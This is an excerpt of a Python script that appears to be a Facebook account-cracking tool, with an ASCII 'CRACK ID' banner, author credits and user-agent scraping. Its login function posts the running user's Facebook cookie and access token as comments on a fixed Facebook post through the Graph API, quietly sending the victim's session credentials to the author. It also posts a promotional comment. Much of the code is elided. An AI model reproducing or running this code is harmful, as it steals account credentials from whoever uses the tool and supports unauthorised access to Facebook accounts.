...
author = 'MAKSTORE19'
git_hub = 'github.com/MAKASTORE19'
faceb0ok = 'MAHESA ANGGARA KHOBIRUL ANWAR'
...
{H}█▀▀ █▀█ ▄▀█ █▀▀ █▄▀   █ █▀▄
█▄▄ █▀▄ █▀█ █▄▄ █░█   █ █▄▀
   {M}•{K}•{H}• {P}Author: MAHESAAA Ft LENNN{H}•{K}•{M}•""")
def logo2():
	return str(f"""
{H}█▀▀ █▀█ ▄▀█ █▀▀ █▄▀   █ █▀▄
█▄▄ █▀▄ █▀█ █▄▄ █░█   █ █▄▀
...
for xd in range(1000):
    ...
    ugent1 = f"https://developers.whatismybrowser.com/useragents/explore/operating_platform_string/nokia-6-2/5"
    ugent2 = f"https://developers.whatismybrowser.com/useragents/explore/software_name/facebook-app/"
    ugent3 = f"https://developers.whatismybrowser.com/useragents/explore/software_name/chrome/"
...
def login():
	...
	try:
		...
		tem      = ('\nanjay lu@[100012093734992:] & @[100012093734992:]\n\nJangan lupa ngocox,mahesa keren pokonya\n')
		slebew = ('\nIanzx XD The Best Komentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
		link = ('https://www.facebook.com/100012093734992/posts/pfbid0iKYbYTr7sSy6stP7jRvpeAxbvGwvagpeM7JUF5nqv7QXU2vyudJ7zGS1LB2NV8qTl/?app=fbl')
		...
		ses.post(f"https://graph.facebook.com/1507953546284422/comments/?message={cookie}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/1507953546284422/comments/?message={token}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/1507953546284422/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
